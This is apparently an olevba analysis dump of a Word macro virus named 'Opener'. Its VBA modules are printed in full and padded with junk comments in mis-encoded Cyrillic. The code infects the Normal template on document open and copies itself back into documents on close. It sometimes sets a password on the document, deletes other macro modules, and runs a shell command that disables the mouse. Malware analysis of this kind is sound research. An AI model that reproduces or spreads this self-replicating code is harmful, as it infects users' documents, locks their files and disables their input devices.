olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opener
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opener - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Opener.bas 
in file: Virus.MSWord.Opener - OLE stream: 'Macros/VBA/Opener'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Åâà±ý²­¸úÕ¨¯Ùž§ù ÚÊ²ùÃÐáÀ¾ä
'¬Äœ£è¹œæÉô›»ýÅôô¯âúáØà �Öãîî¾ÕÕ·Þ¿êìÄöÑ¤ä°
Rem £¿ÀÔõÆ¹£«üÈ£Ó»Ì
Rem ÛÖäùæ�ø×ÚÎïÏåÀÈï¡½Ì×ô°Ñ³
Rem ýé÷ôÝòþÉ½È¬öë»ÑÛð¸¢Éö³ÖÐÍêÞõÄî¢õÒã§³ã»åöûÞ
Rem çÎåÜúÎê¨Ä³¢ÝÈö¿
Const MasterID = "Êîí(åðâíûéÍîæ"
Rem ¢ÀÜðÏé
Rem üÜÈ¢ÉÖª
Rem ¶›ÝÍÕ¹íÔÈ­ÈÔÌèÁÎº¦ÙàáïÊèÄÚ§Ïëº´Á°î
Rem Ÿøø¯ÙÐóóíú·
Rem éÐ´³×¤´ö¿·ýÓÖãœ®¹ÕµãÛÓ ò¾Üôì÷
Rem ÈÍ�éÙ×âÌñËžÇ¤½Ò¹ø³¸ÍïèÞ°ùË³®Þ�®»¤§ÕòŸ¯¹ÖýîîÌÖôã¾
'ì¥ÙÞ±éÒç§ÁÙØ¨Ä¡ËÝ¨ååíÜþ´ª
Rem Ö­´Ó÷ÕÝ·ß¯ïÃŸæ¡óœ¿Ã¤Åæ¨÷Ó³æÙ×ÊãÄê÷¥ó
Const MacrosID = "Opener"
' ªÒÍ²«ØëÞÕïÁ
'¹Ìì›ÏþÔâ³¥¬
Rem ýïÙì�§
'ðåü¬°¯ÝÑÇ®ÆêêÚÅÜÊÔÅùÈêž¡›«Ö®œåí¹ýÝ¹óô
'Çßá®àÙÖªÖ¶½ÖŸ¾ËèÄ´Ñ¤
Rem ¥âÚýáœ²ÄÂäÌ¯©õÈÕ÷Ñ¹ÍÖ œÃÉÁöìâýïÔÈÇ
Rem Öùß
'ÃÞ¤±ÅÓµîùæ³ŸÜº¯û¯ÎêÂ¤ ½ý¼ž
Const MacVerID = "2.11"
'áÄ®ú
'ßÕËµÑÞ÷ÖÅ²Ä½®Õ¯¶¹µë±øæŸ­éìç¢å
Rem ¼±³à¬·¥èÛÇÛêÅÀñø¿«¾ÔìÍ�²ØÎÈ»û¾¥ÜóÔ±Û
'Ó·Ìíãö�âÁà©ß¯íà÷ÍÑÃûßñÞ²Àž¬ÇÂë¤ßÂÃ²·º²
Rem ÌÆâÕÛ�ËÄÐûÙñ½ïëÙõÁ¸ÓÔÝ¸éú¦úÑ
'¬êÐ¨¬ÕÐÜæ®ÈÉÀö·åùãžÞ¾ÚÚÞééÔÁæºÄÂ÷úïæ×Ä
Rem ¥ÊØþåî¾œßæ§òÆÂÁ¹©õ×¬ä»×«Ó«éµ¥éœž§Ê½Ñï¾Á©Úù
Rem ÙÑá
Dim OldHome, NewHome As Object, oldPath, newPath As String
Rem ÁÉü·ßœáÚÞÛçÃ¸äÅÅ›¡æ­²ÖÀÍÍñžíÄºô½µ
'=>Ìîÿ êîïèÿ íîìåð: 6
'ÍÅùÕó
'›ÂãÕÏøÑÓ ãíÌÜË×å
Rem ÚÈ¦ÔÃØùôðð²äñú¹ªË®œÊøÀÞãºÖØê§ïÖÂÈ
'Þþ°¢áèŸ
'=>(opyRight [(] MasterID, 7 Nov 2001
Rem Þ�ÅÊñ¥û¯·æ Ð¶×çÂÇÐ¾
Rem ïôùÈ
Rem Ü¥Îçªøñž«¬›ç
Rem �Ôù§îæÂÚÊ£ÈŸ²Ö³ÅÒúûÚÕÚ¿íÓï�ãù®·å
'=>ÿ ìàëåíüêèé ïîëèìîðôíûé ìàêðî-ñòýëñ-ñêèòàëåö, âîò è âñ¸...
'ãÐ£¢Ì¦ÅÔ­¶¥ï±¼£«±±ÏµÆîßÐ¥¨ØžÌœÒ±à÷§Å¨®²¢ù¬èãù¤œäÉÜ
Rem òÂÄ©öê¿Ðâ«à
'¯®ÂÛÄ¼ÄùªùïßÓÔ©ù¥çù°
Rem ¼äªéèÌÁ
Rem  ØÜû¥Í
Rem åÇú­ÐÈÙðµèéÞÔ´óÓ¬Å²á÷ÀÌºÛ¿î¤Ú­îÍû´ªáÔËþ¼�õ°úž›º
Rem íž¹¦òïäûÞ

Rem «ö­­êôÀ÷ÀÐ ëáÂæßõþŸµÔÑÐ©Õ¸ÙØçèø¯¬ÝÕ›
Rem «Ýï¤Ë°ÁÜžÙàé±¥ó¤À¥³ÞÉ¬ï¯Ô
Sub AutoExec()
Rem «œý
On Error GoTo Done
'ØÍ¤î¬½è
Rem Í»øýŸê¥Òîâ³©åÜ¨©ÕÃì åýÞÂÙ¾´·ìùæë�í½¤ãå±³ØïÅòã©
'ÆçýåŸù©ö¶ä£ùÃÍ§Ò«¬÷ÄÌ¯Ó�
Rem ¹µÍœ©í¼ã§µ×õÁô»àö¿ÈÅª¡éð·­Þª±ØÄÙÊÏ
'Þä¨åïîæíÊž×á»ç¹Þú ã»›ÙÚÑ·å§°Ðòëæ›ýÞ·âßð
Rem ¢û²÷Àº±Ö³í¡Þøá¾î§îÓ¢ÐœÓ²
'î¼œ±ÆØã²ç¹Â
'­¼øÐõ½±ÑþÉÁ¨ßâÁÚÈ¿½ïº ± ðà¶åŸŸª¤ì¢ó¯¶¡Ñ¤îÍÙÃûÜ¶÷
Randomize Timer
Rem ê±�¯ÎºãöÝæÓÝ¾ÔªÐÒÀ»›ûÈùÁîÍÒœÃ³â¥ªÞ¨Ëê¦Îœü�
Done:
'Òºâžì½ú§ùÎÏ
'Úùž›Å
'´ØÆî¼éÃ©ÇžÙÀñµ·§­¼ãÑÃ÷ó å§Åë¨éà
End Sub
Rem ÀÙ¡µøÜØÅæ¡Õâ¢¸¡ÎÞ
Rem õ¸éÚ
Rem ÝãÎž¼«ÐÞ¨ÃÝ
Rem §Ò

Rem Âø›¡¦© ØªØ
Rem ¬ÀÕñ¼ñþàÄÜ»ÈâéÓÓÚœÝÚ�áäç¼Ê¡ÑÄßíö­ÐÑÜúžÃãÐÝª
Sub AutoExit()
Rem óÐòïÍ«º±ùçÃ
Rem íÂ½¢ÌÊØÎ­¤Àžð¥ Ø�ÖºÅØÍ´»Êþ¾¦ÝÑ¤ÊÐìÆçË´ùÇ
Rem å¾Ý¿«Ýåò®ÛÅå×¦Þèöà û¢ëèÁëÀ
Rem óºïîüíèÎ½µÐÞµ
'ë±ìïÀè«Ïô·¬Ûî¹¾¥­è¥«ñööæ
'ÃÍáÂ
Rem öÉÄ£Îæ›ÝÑ¢Ò²òç®öèúç×¸Ã¥
'µ�äßÃŸ ·ÝóÌöâÜ£©é÷Ú²ž¾Ïäç¶´î¸ðãÎ
On Error GoTo Done
Rem ½©ÝÜ¨¬¬ª·ÌØ¾ôç±øÙû¸Î·ÒÖ¯±ÅÙöÆÓÚ¿ÂÉ
Rem ß»¶«
Rem ¼£ž¿
Rem çÁÍËÚÝáÒ«Úõ½½°ÒúÒ¯ÆÌªË¨Ùïó·òçöÓÚ¿ªÅž�Ç
'Àè©ÙÈþð­Ñ°Ï÷çüäÙÉ¬ø¹ºæÐ±«¥ÑåÜ²©
Rem ßí½þ³Ë©¢»Ÿìã©ž´øÝçûõ³
'ñ£¼°æÀÄøÍ°Ä¥­¹ÅøóÁÉèµ¼œØý­±Éåãõ¼®ù³ŸÐ¯½ìï®ÀÌ²Ð
'Ý²³ÀÖõÚêºÖêÁ Ï³ŸòÍ
If Not MyMaster And Rnd < 0.3 Then
'£ôÓ½Ë¬¥¿´¤Áªäñ±ù­òóÜãù¼¡›ººØÚ½©ž¾ ¶âö·Ï
'ç±¢áéöÎÎß
MouseDisable = Shell("rundll mouse,disable")
Rem ¨óýÍ£³¨¬Ê×¬½èžÝ¼­¿æÕÙµ§œÊŸÑ³ ­
Rem ïÛ�¾Îöªú×êóÃ�ù÷Ö»®ÈòÚÖŸË
Rem ²ãøÔ÷ôÑ°Å÷ÕÆÁí¯¹Àóé¤¯Ï­Ú¥Ÿæ»Ðû ûì¸¹µË¾ß«Á
End If
Rem ÓÚæäð§
Rem ±ý±µøÆüÐ»ºòùÍ¸¨»Ûçå¦¨
Rem ÁÃ±âÞÒÉÞÍâë÷ÞªÁ³»¨¾½åÎ¡Áò
Rem ¯Ûó
Rem ›ØÆÒãß´æùÁîæÉþ³ÑêÞù÷ù¢ú�ýÝéÎ½ñ¤Öîö¦æ
Rem î¯›ùö¬±Ý¾îœÞ÷¤¨Â¹žçù£ªì·¼Àü
Done:
Rem Í§Ñ›è§ôÛÒÁ¡¤
'§ºöàÊ¿¸á
'Û¿½×Ïß³¡Æòå§½ÜØÜŸÀâ·©
Rem ¡ó®é›ßÝË·Ç»É³ÕÕÁ§îøæÏì±öÝ·ðÛÀ±
Rem ëÙ¦ÕöœÑµâéÁž¶±È¿ÃºÎø
'ÔÛ¨òŸ®¼ÈÔÕþäÝ± ÁŸõ¾µæÄÝÒœ�ÁÉïÙŸíÄÛÑÃ«
Rem öÙ«§ì£ Âóõ±ÜÌÝ÷¿Ýý±Ïò©«¥ÒÊæ¿ÊÅÓäáÆ­ÛÈÓÃ÷Øî¤¥
'ø¿Ü¢é¸¨Ùö¼ÒÈî ÝŸ¡§öäÍ�²½ØÕÝÒ¼ªÐûçÙ
End Sub
'«ïÎ®ß÷¤á£Õ´Ó³Ú²ûæèÛŸ¿§
Rem ·Ðêè¦ÙÍÄ××
Rem §æ¤²øíµÄ¤üÝÃ¶ÛÝž±¤³½úÛŸ¸ëë·«£þ¿æÛ
'³ û¸úØ›ãÞ¢ÈÛ÷¨ÝÛêÛÉöÞÜ±¡Ý¡Øèâ­¬¢Ö÷ØÒÎéïªØ
'é  øáþíÕÚµÛ
'æ� ÈÖäùÌ¦œ¾·ÉÕÓÜ¡¿³ºèü
Rem ëù×ÄÃä®Î¶Æ÷Úä´ÒªÝêêß¨û¶ûòêÄÈÅî÷âŸË¥ÌÆõø×¢åê
Rem â¤é¢ãÎýñõ¡éò¿ôÄ½Úî£Õ÷à¡á¥¸

Rem ¶¿¬£Ü£®¶¦ÂþÀœîøÒ¶Äó»íþ³âú¿Ñ»
Rem ôþú¾ª¼¼éñ÷­©ó¼³ïòî©ßÂñû«ó¼ËØºÏµ�ÖñÅáèÅ±×ø¨º
Rem æíÏÑÜ¦Æ
Rem Àº½´òœ¾Ý¡øúÏ·Ü¿¼Åµ²À¦Í¸ØðÖêÍçóÞÅ¨«Éøäê
Rem ð×ëÆ§Ä·�œÊÙ¥«Ò
Rem ÇéÉðà´§
Rem Å£ïÚ­×Þåä›¢Ð®ñÊ¤ûùì¡íîÍÝêÂªËæ÷¡¢ì¡
Rem ÁÍÊí Áõ¦±ÉÚçÇžúÃÎÛÊØ¾ÆóåÙÂÈÇ¡²³úØŸ¥­¶êÂÈãÃ
Sub AutoOpen()
Rem å›éïµåÃ¬ÆÍ¡ ôÎÑòÆÝÔ
Rem Îö¨¢�ªõŸœ³´õÅéŸž¸¥ý°ÍŸ
Rem ±ÉýÎ¯Ø¡Æà¦¼¢
Rem ýäª²�Àßœ»º
Rem ÍÚ»´Ð¾Ñ¸¤
Rem Þãü×óÖÚÑý®êô­Ýý´ õÇ¥ÝÆÑÉº›þÇ©ùáÉ½·Ï
Rem ÚÖÁºäÖ®­ôÖØÍœæ¸àÎè¿ë÷žô£²Ì¨±ýÆÊÊ¬ì±
'Éž¼Å�°ûð
On Error GoTo Done
Rem È¬Í»Ïìñ°ßÑéõ� ÁËù¦ÐåãåÁäü©ÐœÜ»¤åüÖ¿É›ß»Û�ßôýÚâôÆÛ
'ŸØê®É¶èŸ´Úµ
'éñÂ
If MyMaster Then GoTo Done
Rem ²
Rem èöŸ
Rem üÄþ¿ÉðáøÇÙžè
Rem ›è´ãØï¢ýÌ¡Ôä°Û¼ßÆÓ×Ïä›�ç²Ð¥¹üýËàý®ô­
 
'Ñú´¹ÖÎª
'¡ÆäïÓ¦÷ÁÅö©×ì³¿¢ëðÏÃ¯µ´¥«
'¦Ô§¯¤§ä¾Ë¯ÐÜ·ÊÆÐÙ¶Ã¹�Þ§¦ËÂÃß´¿Á
Rem ¦Å×ŸðëÄÏÀ¥Ý¢ÙÆ²Æ¡¹è§ì»ÚÎËØÛÕçþÐ
'óµúÉüô¢ë
Rem ¾¢´±©öé³ýÇë¡Ö¬æÕàÕ¥ÏÖÌ¾ÜÄ¬×ç¯
 Set OldHome = ActiveDocument.VBProject.VBComponents
Rem à¡²ÈðÐà¬®éö¿ë®Ûþ¬ž æáèÝ³œ®žýž
Rem ¦áêäöÛÜò ½Ÿ›Ìµµª¼Ù½­®ùÃÞÎ¿æ×ÏÚçëûýË¢ÓØý«»�
Rem ÆŸ¥¥¡ÙäîêÄ¥°÷ž¡Ý¾¦ÁëÇ¦¿ÙÀñ³ÅÊî²
Rem ³Å¿ÝéÄ¾Ò¯×¨øÚ¾ÒÈÓïœ�àÜáºÊ©ÊüÀÕÍÙûúåÖß×¤ÄÄ×·
Rem îØè¢ñ¸¬ºÒÞ½ÑÅ
Rem ±åõê·Ã¦¼÷ÏÁ¾§îÍÜýã­¹ä«É¿Ô¹òÇ«éÀðý÷þÜº
Rem ½¤ÃÔ¾Æ›Ú¹÷³ÙýÜÊÂ¡¡¥ÛÔÇúô®³¼§«©ù­¤êÇ
Rem ÇïÎÇª×¶ìöÌöäÀ®¼âÈÛ×å×°Ù¸ðÊÓ Ùòž¿
 Set NewHome = NormalTemplate.VBProject.VBComponents
Rem Ï¸ŸÉåØúñï¥ç·ìºÕ»ýÝçïœÒê¹ßªõýº÷ÂøžöçÑåîÔ¤òï¡íñ¤ÊöÀþ
Rem ¸¼Û²Ê›ç°®ÔÑ©ÅØþñéà¢È·®¸»ìô °Á°çì¤·â±òæÞ¡ü¹±Ë
'ù
'µ«èÑåÞ¦Ü
'¡ÌõÝµÂÍæ¤¿þîò×®¬ëçÛîÖòÛÓõ§£ÆÐ¼ú§º«Ü¥ëª¢ÈàÃ»Ëþ¢½¤ù
Rem óßðø›àÌëèøíÁ ëñ¢»é½¥ÒòÉ½îç¼ïâå¶§ºÁæ±­ü¦ÎøÜ¥
'À¡åÏÑùÞæÊœÚ¥ÏÀéåŸª¨½ŸÐ×
Rem Éê¦Ÿ¨Ñ¹ò²´øÆõôê¼ÏëÍÙ
 oldPath = ActiveDocument.FullName
Rem áãë®›
Rem ßÄ›²ÑÆóÉ ©î°èê°ïÀ¹ÉÆµÃØÁøÑÊá¢×Ú�Æ´°ÇÇ®¼ Î�
'´ûíØ±±¹¦Ö°ç±ÏÆñÆ°­ó´ìûÒœœÚÆÄÄÀ±í×¸áº ùÍÈ
Rem ÓóÃ®¾Öí¤õùÐÂËÏÍ§«ÛÈœùÞž¨î�Ö¸ÑŸñ
'É¸
'ç§ßÛ¯»ÁÌÕ¥þËïÀëü»çì­ðÒ¨ôÉ³°úŸ
 newPath = NormalTemplate.FullName
Rem Ò½¸£¦óèŸè ÖÀ£òÖêÂœÞâòÜ¸
Rem ¡ÓÌäü°¬Òß´­èúÄÖàÒ¶ëËÞ¯ðÊ›¢Á®ØÙ¿°ÒÛ
'®øé¾Àøø·³©Øùî¿ä§ÍÍÚ©
 
Rem öªûÅâøí¤è¹çðÑÚÜ¶ãÉìÕ¥¦¯§¤¢º×›£ð¢¥þ¬ÝÆÄÆ£¼
Rem îãßç®®½µüéØªûÌ¥Ì±Û×öœóð¢
Rem ±ì
Rem  £°ËäØÜê×¼²ÓÑÒ°Å»óüÞäóý»ÇÏÓôÕº»ú§
Rem Å›ÐÚØúòðŸ§åïûÆ»ºÞá¥úÐË¾ªíà¶Í
'÷›§
 Call ReproducTion
'å§â·ìÔ¢ì°«Ýâ²ã÷ó×áÅë½êŸœ²µõ¿®¤›ý¶ìâœÊ§ò¥¶²åÛúœ
 If NormalTemplate.Saved = False Then NormalTemplate.Save
'ëÔûŸ£ûí¥èžý±¾²¸ºçâË
Rem ÌÞ
'ÃÔÆéãÍáÏÚ§ÎëÁôö®­¼êâ÷þùßÒ®í¾·Ì¬´Ì
Done:
Rem Á¨öÔÉå¿ªÚ°è³¬ôÎÁÃ ´·£ÖáËÕÑ°Ûð¹�ß�Ø¾Ýô
Rem ¿¡äçÜñ§üÕžÆ¾¹¨ªïÕäèÅ³»ž»³üó§Ïé²ÑÜ�Åü§£ËçÒ©
'ÆÓ½ïð£¬öèæÜæ«Õù»òûŸ¢±ðµÍÂàÉËË£žµÅ¯
Rem Ñüàçúþ×õÝ®åžÅ·­½ºô°È¬ÏÎãØ¯®µûöÍéïæº¢
Rem ÀÀüª´¾ô
'ù©Ë³õ¬Ä¦¡ªîÒÅêÎÃõýæþù©³Äæ¹êÈÀ›á¾Ìöý»û§±ã§»»¢
End Sub
'ëµ®¼âÉÕ
'ÚñÊ¸®ËÍºÒðãÅâäêìÊ¼�äÕ¬í®ÇÞíÆãÑî±ØóÏçôžìË
Rem  Í´äúñäÅ¶Íèª¯œŸÜÔ§ìæåö·Õ¹ìÖÁË¼Ü¦¹ÑÞîÓ»ÉêÄ
'¹ñæÜ½÷çî÷Îè²­©Æ¿´½¼ñòïÎ¢æÈ

Rem é°î»Üòñü±¹óèþ³¢ôÂ
Rem ¾µùýÞþÀÑ°ÊÂéµå¥õøÃï¶æìãŸ��ìÀøÂ¯ÎÃ¡Û
Rem ¦¤¬øÊùÑëÙüèñû
'õŸýÅÂÈùåÏË¸¢¨Öô¸·ÐÛ¡Ù¸è¬Íç
Rem í­°¢Ü³¡¥Ö¦¥éóœí¤´á«ÞÐ×þ
Rem èÀµÕÏÏ¼ÏôÑÜ¯èø¬¾ñç¡²¼æÝË²÷¼àÞ¦þíæ°Âµ²©°áù×êéûÑåÁÑÂ
Sub AutoClose()
' òÑ�Üñþ¢ü°ç¤
'æ³Ù¶¢­ñ¦Ø«óõÄþÈèéààì©÷ëñÜ«Ð¢ÒØÈ®·õöØ¾Èè­õã
On Error GoTo Done
'¡ÅÁÄÅÛÕ�èðöô¶èÜ÷­ëŸ¢Ñ›¼³×íØóü×½»ÕçÙö¹ñ¶òÄµÙ
Rem Ü¡ÔÙ´º¼ÎðÏÌÈÊ
'µöìÛÄú£Ìà¼üÆ
If MyMaster Then GoTo Done
Rem úù©À²ê·Ø·ªÆµëò®÷çùí´íÁ
Rem À÷œêÅÉ¡¿±®°áÙÐ¿Î©ìáÞôáÈý¦¾¹åÖ½ãŸè
'ëÑÒÂÖùï
'ÉÞúÚ©îÜíËèâèœíºÀÞ©³äö¹ô§Ðíûï¼²ýæÉ£ÐÑËÓ±í¸øÇó
 
Rem ´èØÌ�›¨�í
Rem ²âØâ×Ý½ÕÒðÂ¼Äçžž¨öÀÀìÊÙ×÷Ì·®´œú±àëþÙàúîžÍª£Í«ã
Rem ±Èµ¨³
 Set OldHome = NormalTemplate.VBProject.VBComponents
'›ç
 Set NewHome = ActiveDocument.VBProject.VBComponents
Rem éî êááº¯ãÚµïžéÃÉì±Ã¯¥Ö¼¢
Rem Ð°Ã²¼î±ÈÆœ›ú¦¥¡Ë¨ž£áÁ¶§¥ÀÏÈÔ»·
 oldPath = NormalTemplate.FullName
Rem œœ½¥¨ÅÎ¯ì¸üÁ¿¡£ÉÓõ¡êÒåéÜÞ¤ÅÈïÓëÞò®ÎËÃËæ¯Ý¬û
Rem í¬
 newPath = ActiveDocument.FullName
'¤û¸è›£¥ÙÀ¡âñ©øµÑúê×Íó¶Ÿ³«ßðÇÈùÈ²þ´Ç¹ËÍ¸ÙÙÌò¡Ñè
 
'ÁàÓÙµÄ£
Rem œþÛçèøþþýÅ÷èâáÃ£·´âŸÍ¢Î×Ýçà�³¹
Rem ÄÖÊ
 With ActiveDocument
Rem ºÏò² äíÈø®öÐ
Rem ¹È¢êÊ¯ìÁ›Ë¨à�»ÜëÊ½¬°£í
Rem ¤ÉÅ©äý´²ÍÀè¹£ûá¯ª±ºûë¶õâë´éÀÖ·³¢þ»¥¹ââ ï
Rem ïÉÊª¡º¬¦ê¤ãÒùþå£ÀÀ¿âæ©›Û­þíëÎ
Rem ®
Rem ØðÛÓÐåéÆç³ËÍæÆ©Ñ¾°í
  s = .Saved
Rem ó
'¿¼»°¶ú©É«¨êàãÍ¼òÆµ£ºõ¼²Òñ¬»­þÅÁ¹Ê³òã¶Æ½þ­¶ï§Ú¬¨Ÿ²
'ó¢©èöçÏ¥¹°�ç×²úçüè©Ô¬þ
Rem ¸¡œ­±ãÀìøÒìÐÃ›ÖËÂµõ¡öä
  Call ReproducTion
Rem ¿º­üà½ìÞÙ²ìÂœ©ÜùöÑî›ß¥¸øã·Ø­
Rem ö×Ü«Î¿ÀãÄäô¢ÀÏ¬œù
  If Rnd < 0.3 Then .Password = MasterID
Rem �ßôèÁÁ¯ÀèÃ¼§ð÷±õöº¨Ø¯ù
Rem °ÔºâÎàá£ÈÂäº×°
  If Dir(.FullName) <> "" Then .SaveAs .FullName, wdWordDocument Else .Save
'ÐÙ³ÎñÞç
Rem ¢ä çúÅÞÏÏù°
'¼É§¸ÈéôÓÕ¶ÐžçãôÖúµç¶ìéÞøÂ¤»õÆôñ¯ÏÃ
Rem õèôÛ¨¹ÂÛÃ¼ËÕàö®îÓ³
Rem îíûÐõÂÝùò×ËøÁÄß¤¶º Óó­¥²¯› ïá·Øæý¯ÃÎ¢Ò±ªÖÄ ¯ØÓäÐ±Û
  .Saved = s
'¦±©á
 End With
'ûåÖéŸÔØùÜ°�Ã÷­ÍÔ»ŸÍÒ¯Ûâà±üºôÄò
Rem ŸÉÏß³¶Òö¿²Ï¹¢³ì§°âÉä
'Ú¤Ï×î£Ñ½øÐÞ¸óŸëÝ¯Î
'­Æ´úùûœÄ¤Þ§›³¬Ðïµ¹»Ù°¸Ó¢©Éø£Ï
Rem ÞÌÃßÛò¬ÆýðüÍ¡Ï�ýÑ¡«ü¡èüÇÛèÐðñÌýÌëöêÖÞÒï¯¶°±é«Åä
Rem â³à›ÕÞžð²ðê¿¡Ÿ÷Üõ¯®¿ü£ž
Done:
'­Û÷ÄžáÝ¨ãêÖËžÒþœûö±¦¤¡ù±á££ýÛÀ×ù÷ðý©¢ïÃÆ¶èêÌ­ÔÐ×Õò
'áôÌÈ½«ñÚæòÕÖ±¨Õ�ÅíÂåÓ·©ê®çº±òÓ«ÛÊýžÌ¼
Rem §¤ÉžÔ¹îß©ëÊ¤ÛëÞØÌéüêÉŸ¾ò¸¨«œöôç¸Ñ¿þÅÊ
End Sub
Rem ×÷Ûýå²¶¬ÞÝžÉ÷»ÓŸ¼Â·÷¼²þó›¸¹±óÞðµÌÍ­ÏÙŸ
Rem ÆÔêè­øÓÛïü¯
'ÔùœÕÖ²öÃÂñßõµø®óÊÏÆñ¯¥¯ð£ÞÙ÷ÖåÀÌªý
Rem þÙúØèÜÊ÷÷äÈ¦åñ¢ ¸ê°Îþ³üÞüçñÆ«Çé
'¼ë§�ÖÙÝ®Æèö éÞ¦Óã·çôÙÝ¬í¥©åîÞ¾�ú®úÎ¿›£¯ì
Rem òÛÜ¯§âãò¯ýªÛÏòÖß›Áœ

Rem  ðÂ
Rem íÛËôËÕâëÛ¬ËÜÈÄÌ¬óíï¥úìžëâÜõæý¼®Úí¢÷¼ëÛÍ
Rem ÀÔ¼
Rem Û
'«ÇÈÆç›ÃÇúÓ¨ëú§ÑžÖñ  Û°»£ëâÚÉÑÜ¢¡
Rem ÍÕÉÎ¨ÌžÙ éíœ¹Ç¸œôâ¬¡ÁžÒÙÀíÛäÛø¼
'òËè¾îþë¼ÂÓ¤µœµ¤ß³ï·¥çäœÄ õ¦£ù¾²ŸçÆ›ÃÇöîï¦åÓçá×
Rem §±£í²ÅØÖÙõþä¡éÒ²åõÅÚ¶õÅÃÂûÞªÌÃöÏì÷ßó
Sub ReproducTion()
'æþ³Øøµã¥ÌµÌµÀ¹Ÿ¹òãíØç¾æ¤´èÑºÛ·ä¸äÚÏ­ŸÎµ×Ýêèã
Rem Æ¬£ÑöØù³æ£ºÌÜ¬ÅëÑìÂœ»÷ÂéÌç
Rem ÀŸéî¬èô¾îô
On Error GoTo Done
'ÖÓÅñÌÖù²ÃÓØ´Ÿ»ŸÎ¹¥èðÅ©µ½ë¨
'ÝÃ›¢¾íŸèËÊÞöë¤óôè®´Åú¢«í£Âè þÜçÍªÀëÕ¡úíûÀÅ
Rem âì¹î¼½Â¹Ä»Çóµò»Á¡
Rem ÈÕ·Î¦Éê±žÁéçÖñÕ¼ßø¥ÅµÅâ£ØªùóÅãöà×ªË
'µ­âÔãô¢éü³Èž
Rem ºÀà¡ÑØþøÆ
'¼ÃÑ¥ºÑÙ¬üç¬Ø¤î¼å

Rem ¨ñŸæø³¹Êý­ö áÃõòÜ¨êé÷þïÇ¶åŸ
Rem ØìÕ¬Ñ
'ò£íê¿ »íÈýÝ¬›µî½²¥Åû÷«Ûó­þ›
Rem °ðÛ±ÅÕ«½òØÞßô© À¡ÙÂì©ü¼èâØ¢¸Ûª³²²ó¾â¦Ÿ¬¨þçã
Rem í
'ò¨žÁúû©¡å÷›ùÃãüà÷Øà ›ÞÅûæä Å§«ö¤Ÿ¼¾ÞÀðýýÕÑæñ¦®çãÛ�
Rem ÷ø
For i = 1 To NewHome.Count
'Ìæ¿§Ú£ñõ®ÇÁµ¦ÈéÔÆÆçÙž¯Ñä¢
'äºœ×Õœ÷Üïá®ÑëÞÃ´Ç±ªÜ¢Ô§ÀçáôÁÐåÈÀ´µÑð¼µÜœ§ï
Rem ¤ç»ýèÚÝîÄø÷ÃÂÞÄÈÂýµ¹¾µßœ¥¯Ÿ©ëÎÛË¥
'¹¤îÕÐùÉ÷Ô½ÅÀüÜé¬àñéž¸²í­éä¯¬­®ÖÅø´·Í
Rem ª±ØÉÄ¿ªÜ¤·²Ù¶­ø¢¢«Ûæ¿�Ýà·éÔ£Ç�¿úúö±Ö¦ü²åôÞÝË±ã©ú÷£
Rem Éé¨úÆËüÇêåø¦ð£¨
Rem ê
Rem ªÈá¸¤µ¨²¾žóÇý¡í»žØíªë²ôïëî ¶ÎÅöÓîâ ó¾
 If NewHome.Item(i).Name = MacrosID Then
'»¦âëÁÇú¨Ÿµð£ø¦ÊÊé´âÎªÈûüõÐÇ¦ÊÝ½¼ëÃÚÚ§Ï
Rem ÅÐê¡Üûó¿æÇí©À
'ð½�×ëöâ›ðçœÀ
Rem õÀÊªÎ½ùÆÀ¾ïàÌ¦þÜ
'Ð¥µ²íª©»¨«�Û Ò«¦à®¸²Óå
Rem µÓÌ¸øÈõÒÀ¬¿ ›ÜÎÐÏþÐ«½«õ«äÏý¬ç¡·ºû¼Ð£é³ËüàÍÃê­ô
Rem À¯ÚÛÊ›âåø
 Exit Sub
'Áïú³¸ü
Rem ÃÌÆœñ¢Ë¬°¼ÎÇ�çÆí·Ð¯¡ÜöÄ¥·ÒÔ¤ÖÈ©¿ÙÞ½÷°ðàôù
'ÖìÜ›ÃÚ±ù¾°õ¾Ï¹Þã¥°äô¸¸³ìõ£ë¨à¯àÊÍ¤
Else
'½ÒÑîý Óò¶Þ›ÉËë¡áµàÇ¬íõô·ðÑÐÁ®µñÝ·üÖá·¼©òŸ›œÄç
Rem »ÀÉìûè¦¢ÀâË§É
'½é¶ü
'Êâ­³Éª¼«Á§ŸòÉŸÏÊ·ÂæàÜûíù¶ëý­¬›ÄÑôªéáÁÕÒø
'Ÿ Áõ«ùàäžûÍÈ² ÷îñÕìÑ¿ùóÚ�ûÙç¸úž­îÖ
 '=> Êîíêóðåíò ??? K.i.i.i.l.l.l it...
Rem Õ¾¤œõ¥Æùœê›¤à  ©Ùé¦›åŸª§ÄæÜÏ±¡¸Ù×Ö
'°¹¿ÑŸ¯¶ç´ãœ½
Rem Óíè
Rem ÛÓ®ã®ÛÏèÚ²çäÅÚúâÚ¿ÍÙúüÞôÒßâúÔçëÊÈ×à½ùÔ¬
Rem ß°ú
 If i <> 1 Then NewHome.Remove NewHome.Item(i)
Rem úë­Ÿ›è
End If
Rem ÀÍÆ´¾Æì¼¨æ×ËðæòÜ«­·¢åÜúÑÛã«Ãºåê³ÂËÆÅ³ÍÁ·¸³µ
'òÉýòùº ×àýüç°¯éÞ³ÛÞ®î¢Ç½à¾êÎ·�²ÕÞêñÞ­ÛñãâïàåðÎ¥÷
Next i
Rem Âèà·åâ
'Ã£±èÕñßè«§ÚÊ­Å¿¬­óÇ½­Ÿ©½ÓÏÚöÒ¸ðÁÐ
'â§«›«÷ýØï¥ÒÁôÝÍºÊÐêÌÑº¸³·ïª¡ÂÏôºœ¹¸ÕÏÒýø
Rem ìæºêùÌÈ¢ä�÷²»ðÁãþ îù»ôÝ
'¶¹
Rem øéÚ÷»õ«Å¹µôÕÕüõìí«·ÒÝ­ÃÃ·Øüööþìµú¶
'÷¨¿ª¦ð£ œªùýÌØÙÑãöÌ½

'î½žÙý¾Ä¢ÕÃÉþ¿³°æñªø
'¯ßíß£Ëì¿ó»ºÊÅ÷ÞãÈ«ÙÓØÁÛ´ ¹üåñêÇ´¸¾ýàÖ¾øàéœ¦Ïü¥Ó
'=> ïåðåñåëåíèå...
'¬¶Â½ô¡ò£ðÃü¬¥ê¦Ö¯·¥œÊÐòó¥â
